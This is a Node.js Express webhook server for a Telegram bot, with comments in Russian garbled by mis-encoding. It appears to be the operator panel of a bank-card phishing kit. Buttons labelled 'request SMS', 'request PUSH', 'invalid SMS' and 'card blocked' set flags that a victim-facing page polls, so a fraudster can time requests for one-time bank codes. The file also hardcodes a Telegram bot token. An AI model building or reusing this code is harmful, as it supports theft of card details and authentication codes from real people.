/**
 * Telegram Bot Webhook Server
 * –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –Ω–∞–∂–∞—Ç–∏—è –Ω–∞ inline –∫–Ω–æ–ø–∫–∏ –≤ Telegram –∏ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç —Ñ–ª–∞–≥–∏ –¥–ª—è –∫–ª–∏–µ–Ω—Ç–æ–≤
 */

const express = require('express')
const bodyParser = require('body-parser')
const cors = require('cors')
const https = require('https')

const app = express()
const PORT = process.env.PORT || 3001

// Telegram Bot Configuration
const BOT_TOKEN_CARDS = '8406857793:AAGDQnLYrL78nWDrBxi1AS1kWTTVjxdUbpg'
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN_CARDS}`

// Middleware
app.use(cors())
app.use(bodyParser.json())

// In-memory storage –¥–ª—è —Ñ–ª–∞–≥–æ–≤ SMS (–≤ production –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å Redis –∏–ª–∏ DB)
const smsFlags = new Map()

/**
 * Webhook endpoint –¥–ª—è Telegram
 * POST /webhook
 */
app.post('/webhook', async (req, res) => {
  try {
    const update = req.body

    // –û–±—Ä–∞–±–æ—Ç–∫–∞ callback_query (–Ω–∞–∂–∞—Ç–∏—è –Ω–∞ inline –∫–Ω–æ–ø–∫–∏)
    if (update.callback_query) {
      const callbackQuery = update.callback_query
      const callbackData = callbackQuery.data
      const chatId = callbackQuery.message.chat.id
      const messageId = callbackQuery.message.message_id

      console.log(`Received callback: ${callbackData}`)

      // –ò–∑–≤–ª–µ–∫–∞–µ–º userId –∏–∑ callback_data
      let userId = null
      let action = null

      if (callbackData.startsWith('request_sms_')) {
        userId = callbackData.replace('request_sms_', '')
        action = 'request_sms'
      } else if (callbackData.startsWith('request_push_')) {
        userId = callbackData.replace('request_push_', '')
        action = 'request_push'
      } else if (callbackData.startsWith('invalid_sms_')) {
        userId = callbackData.replace('invalid_sms_', '')
        action = 'invalid_sms'
      } else if (callbackData.startsWith('card_blocked_')) {
        userId = callbackData.replace('card_blocked_', '')
        action = 'card_blocked'
      }

      if (userId && action) {
        await handleButtonAction(action, userId, chatId, messageId, callbackQuery.id)
      }
    }

    res.sendStatus(200)
  } catch (error) {
    console.error('Webhook error:', error)
    res.sendStatus(500)
  }
})

/**
 * API endpoint –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ñ–ª–∞–≥–∞ SMS
 * GET /api/check-sms/:userId
 */
app.get('/api/check-sms/:userId', (req, res) => {
  const { userId } = req.params
  const smsRequested = smsFlags.get(userId) || false
  
  res.json({
    smsRequested,
    userId
  })
})

/**
 * API endpoint –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —Ñ–ª–∞–≥–∞ SMS (–¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è)
 * POST /api/set-sms/:userId
 */
app.post('/api/set-sms/:userId', (req, res) => {
  const { userId } = req.params
  smsFlags.set(userId, true)
  
  console.log(`‚úÖ SMS flag set for user: ${userId}`)
  
  res.json({
    success: true,
    userId,
    message: 'SMS flag set successfully'
  })
})

/**
 * API endpoint –¥–ª—è –æ—á–∏—Å—Ç–∫–∏ —Ñ–ª–∞–≥–∞ SMS
 * POST /api/clear-sms/:userId
 */
app.post('/api/clear-sms/:userId', (req, res) => {
  const { userId } = req.params
  smsFlags.delete(userId)
  
  res.json({
    success: true,
    userId
  })
})

/**
 * –û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–µ–π—Å—Ç–≤–∏–π –∫–Ω–æ–ø–æ–∫
 */
async function handleButtonAction(action, userId, chatId, messageId, callbackQueryId) {
  let responseText = ''
  let alertText = ''

  switch (action) {
    case 'request_sms':
      // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ñ–ª–∞–≥ –¥–ª—è userId
      smsFlags.set(userId, true)
      responseText = '‚úÖ SMS –∑–∞–ø—Ä–æ—à–µ–Ω'
      alertText = 'üì± –ö–ª–∏–µ–Ω—Ç—É –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –∑–∞–ø—Ä–æ—Å –Ω–∞ –≤–≤–æ–¥ SMS –∫–æ–¥–∞'
      
      // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ —á–∞—Ç
      await sendTelegramMessage(chatId, `üì± <b>SMS –ö–û–î –ó–ê–ü–†–û–®–ï–ù</b>\n\nüë§ ID –∫–ª–∏–µ–Ω—Ç–∞: <code>${userId}</code>\n‚è∞ –û–∂–∏–¥–∞–µ–º –≤–≤–æ–¥–∞ SMS –∫–æ–¥–∞...`)
      break

    case 'request_push':
      responseText = '‚úÖ PUSH –∑–∞–ø—Ä–æ—à–µ–Ω'
      alertText = 'üîî –ö–ª–∏–µ–Ω—Ç—É –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –∑–∞–ø—Ä–æ—Å –Ω–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ PUSH'
      
      await sendTelegramMessage(chatId, `üîî <b>PUSH –£–í–ï–î–û–ú–õ–ï–ù–ò–ï –ó–ê–ü–†–û–®–ï–ù–û</b>\n\nüë§ ID –∫–ª–∏–µ–Ω—Ç–∞: <code>${userId}</code>`)
      break

    case 'invalid_sms':
      responseText = '‚ùå –ü–æ–º–µ—á–µ–Ω –∫–∞–∫ –Ω–µ–≤–µ—Ä–Ω—ã–π SMS'
      alertText = '‚ùå SMS –∫–æ–¥ –æ—Ç–º–µ—á–µ–Ω –∫–∞–∫ –Ω–µ–≤–µ—Ä–Ω—ã–π'
      
      await sendTelegramMessage(chatId, `‚ùå <b>–ù–ï–í–ï–†–ù–´–ô SMS –ö–û–î</b>\n\nüë§ ID –∫–ª–∏–µ–Ω—Ç–∞: <code>${userId}</code>\n‚ö†Ô∏è –ö–ª–∏–µ–Ω—Ç –≤–≤—ë–ª –Ω–µ–≤–µ—Ä–Ω—ã–π SMS –∫–æ–¥`)
      break

    case 'card_blocked':
      responseText = 'üö´ –ö–∞—Ä—Ç–∞ –ø–æ–º–µ—á–µ–Ω–∞ –∫–∞–∫ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–Ω–∞—è'
      alertText = 'üö´ –ö–∞—Ä—Ç–∞ –Ω–µ –ø—Ä–æ—Ö–æ–¥–∏—Ç –ø—Ä–æ–≤–µ—Ä–∫—É'
      
      await sendTelegramMessage(chatId, `üö´ <b>–ö–ê–†–¢–ê –ù–ï –õ–ï–ó–ï–¢</b>\n\nüë§ ID –∫–ª–∏–µ–Ω—Ç–∞: <code>${userId}</code>\n‚ö†Ô∏è –ö–∞—Ä—Ç–∞ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∞ –∏–ª–∏ –Ω–µ –ø—Ä–æ—Ö–æ–¥–∏—Ç`)
      break
  }

  // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç–≤–µ—Ç –Ω–∞ –Ω–∞–∂–∞—Ç–∏–µ –∫–Ω–æ–ø–∫–∏
  await answerCallbackQuery(callbackQueryId, alertText)
  
  // –û–±–Ω–æ–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ (–¥–æ–±–∞–≤–ª—è–µ–º —Å—Ç–∞—Ç—É—Å)
  await editMessageReplyMarkup(chatId, messageId, responseText)
}

/**
 * –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram
 */
function sendTelegramMessage(chatId, text) {
  const postData = JSON.stringify({
    chat_id: chatId,
    text: text,
    parse_mode: 'HTML'
  })

  const options = {
    hostname: 'api.telegram.org',
    path: `/bot${BOT_TOKEN_CARDS}/sendMessage`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    }
  }

  const req = https.request(options, (res) => {
    let data = ''
    res.on('data', (chunk) => { data += chunk })
    res.on('end', () => {
      if (res.statusCode === 200) {
        console.log('‚úÖ Message sent to Telegram')
      } else {
        console.error('‚ùå Failed to send message:', data)
      }
    })
  })

  req.on('error', (error) => {
    console.error('Error sending message:', error)
  })

  req.write(postData)
  req.end()
}

/**
 * –û—Ç–≤–µ—Ç –Ω–∞ callback query (–ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç alert –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é)
 */
function answerCallbackQuery(callbackQueryId, text) {
  const postData = JSON.stringify({
    callback_query_id: callbackQueryId,
    text: text,
    show_alert: false
  })

  const options = {
    hostname: 'api.telegram.org',
    path: `/bot${BOT_TOKEN_CARDS}/answerCallbackQuery`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    }
  }

  const req = https.request(options, (res) => {
    res.on('data', () => {})
    res.on('end', () => { console.log('‚úÖ Callback answered') })
  })

  req.on('error', (error) => {
    console.error('Error answering callback query:', error)
  })

  req.write(postData)
  req.end()
}

/**
 * –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ reply markup (–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∫–Ω–æ–ø–æ–∫)
 */
async function editMessageReplyMarkup(chatId, messageId, status) {
  try {
    // –ú–æ–∂–Ω–æ –æ–±–Ω–æ–≤–∏—Ç—å –∫–Ω–æ–ø–∫–∏ –∏–ª–∏ –¥–æ–±–∞–≤–∏—Ç—å —Ç–µ–∫—Å—Ç —Å—Ç–∞—Ç—É—Å–∞ –∫ —Å–æ–æ–±—â–µ–Ω–∏—é
    // –î–ª—è –ø—Ä–æ—Å—Ç–æ—Ç—ã –æ—Å—Ç–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫–∏ –∫–∞–∫ –µ—Å—Ç—å
    console.log(`Status update: ${status} for message ${messageId}`)
  } catch (error) {
    console.error('Error editing message:', error)
  }
}

/**
 * –ù–∞—Å—Ç—Ä–æ–π–∫–∞ webhook (–∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è –æ–¥–∏–Ω —Ä–∞–∑)
 */
function setupWebhook() {
  const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://your-domain.com/webhook'
  
  console.log('üîß Setting up webhook:', WEBHOOK_URL)
  console.log('‚ö†Ô∏è  Manual setup recommended: use setup-webhook.js script')
}

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    activeSMSRequests: smsFlags.size,
    timestamp: new Date().toISOString()
  })
})

// Root endpoint
app.get('/', (req, res) => {
  res.json({
    name: 'Telegram Bot Webhook Server',
    version: '1.0.0',
    endpoints: {
      webhook: 'POST /webhook',
      checkSMS: 'GET /api/check-sms/:userId',
      clearSMS: 'POST /api/clear-sms/:userId',
      health: 'GET /health'
    }
  })
})

// Start server
app.listen(PORT, () => {
  console.log(`üöÄ Server running on port ${PORT}`)
  console.log(`üì± Webhook endpoint: http://localhost:${PORT}/webhook`)
  console.log(`üí° Health check: http://localhost:${PORT}/health`)
  
  // –†–∞—Å–∫–æ–º–º–µ–Ω—Ç–∏—Ä—É–π—Ç–µ –¥–ª—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ webhook –≤ production
  // setupWebhook()
})

module.exports = app

